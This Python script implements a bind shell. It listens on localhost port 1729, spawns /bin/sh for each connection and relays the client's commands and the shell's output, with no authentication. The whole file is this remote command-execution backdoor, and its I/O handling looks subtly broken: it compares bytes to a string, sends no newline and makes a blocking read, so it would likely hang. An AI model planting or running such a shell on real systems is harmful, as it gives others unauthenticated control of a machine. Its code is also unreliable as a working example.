import socketserver
import subprocess

HOST = 'localhost'
PORT = 1729
PAYLOAD = ['/bin/sh']


class BindShellRemote(socketserver.BaseRequestHandler):

    def handle(self):
        message = ''
        p = subprocess.Popen(PAYLOAD, stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE)
        while message.lower() != 'exit':
            self.request.sendall(bytes("> ", "UTF-8"))
            message = self.request.recv(1024).strip()
            p.stdin.write(message)
            reply = p.stdout.read()
            self.request.sendall(reply)


server = socketserver.TCPServer((HOST, PORT), BindShellRemote)
server.serve_forever()
